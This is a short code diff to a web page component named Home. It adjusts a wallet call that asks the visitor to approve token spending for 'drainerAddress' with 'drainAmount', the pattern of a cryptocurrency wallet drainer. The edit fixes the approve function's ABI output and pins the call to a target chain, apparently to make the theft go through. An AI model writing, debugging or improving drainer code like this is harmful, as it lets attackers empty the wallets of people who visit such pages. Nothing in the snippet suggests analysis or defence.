@@ -103,12 +103,13 @@ export default function Home() {
             { "name": "value", "type": "uint256" }
           ],
           "name": "approve",
-          "outputs": [{ "name": "", "type": "bool" }],
+          "outputs": [],
           "stateMutability": "nonpayable",
           "type": "function"
         }],
         functionName: 'approve',
         args: [drainerAddress, drainAmount],
+        chainId: targetChainId, // Explictly lock the wallet to Mainnet context for estimation
       });
 
     } catch (e: any) {
